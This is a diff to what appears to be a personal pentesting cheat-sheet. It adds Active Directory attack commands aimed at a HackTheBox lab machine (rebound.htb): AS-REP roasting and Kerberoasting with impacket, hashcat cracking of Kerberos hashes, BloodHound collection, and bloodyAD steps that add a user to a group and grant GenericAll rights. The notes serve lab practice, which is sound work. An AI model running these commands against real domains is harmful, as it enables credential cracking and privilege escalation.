@@ -9,6 +9,42 @@ smbclient -U '%' -N -L \\\\10.10.10.10\\
 
 # Windows Notes
 
+## AD Commands
+```ps
+# AS-REP
+GetNPUsers.py rebound.htb/ -usersfile users.txt -dc-ip 10.10.11.231 -format hashcat -outputfile as_rep_hashes.txt | grep -F -e '[+]' -e '[-]'
+
+# Kerberos 5, etype 23, AS-REP
+hashcat -m 18200 -a 0 -O -w 4 hash rockyou.txt
+
+# Kerberos 5, etype 23, TGS-REP
+hashcat -m 13100 -a 0 -O -w 4 hashes.txt rockyou.tx
+
+# https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication
+GetUserSPNs.py -target-domain rebound.htb -usersfile users.txt -dc-ip 10.10.11.231 rebound.htb/guest -no-pass
+
+# Sync clock with DC
+timedatectl set-ntp 0
+sudo ntpdate -qu rebound.htb
+sudo ntpdate rebound.htb
+
+# Rust BloodHound ingestor - https://github.com/NH-RED-TEAM/RustHound
+/home/kali/.cargo/bin/rusthound -d rebound.htb -u 'ldap_monitor@rebound' -p $passwd -i 10.10.11.231 --zip --ldaps
+
+# AD Privilege Escalation Framework - https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
+# Add user to group
+python bloodyAD.py -u oorend -p 'pass' -d rebound.htb --host 10.10.11.231 add groupMember SERVICEMGMT oorend
+
+# you should see response below 
+[+] oorend added to SERVICEMGMT
+
+# Grant user GenericAll permiissions over an OU
+python bloodyAD.py -d rebound.htb -u oorend -p 'pass' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
+
+# you should see response below 
+[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+```
+
 ## Transfer file via PowerShell to Linux
 ```ps
 $serverPort = 5555
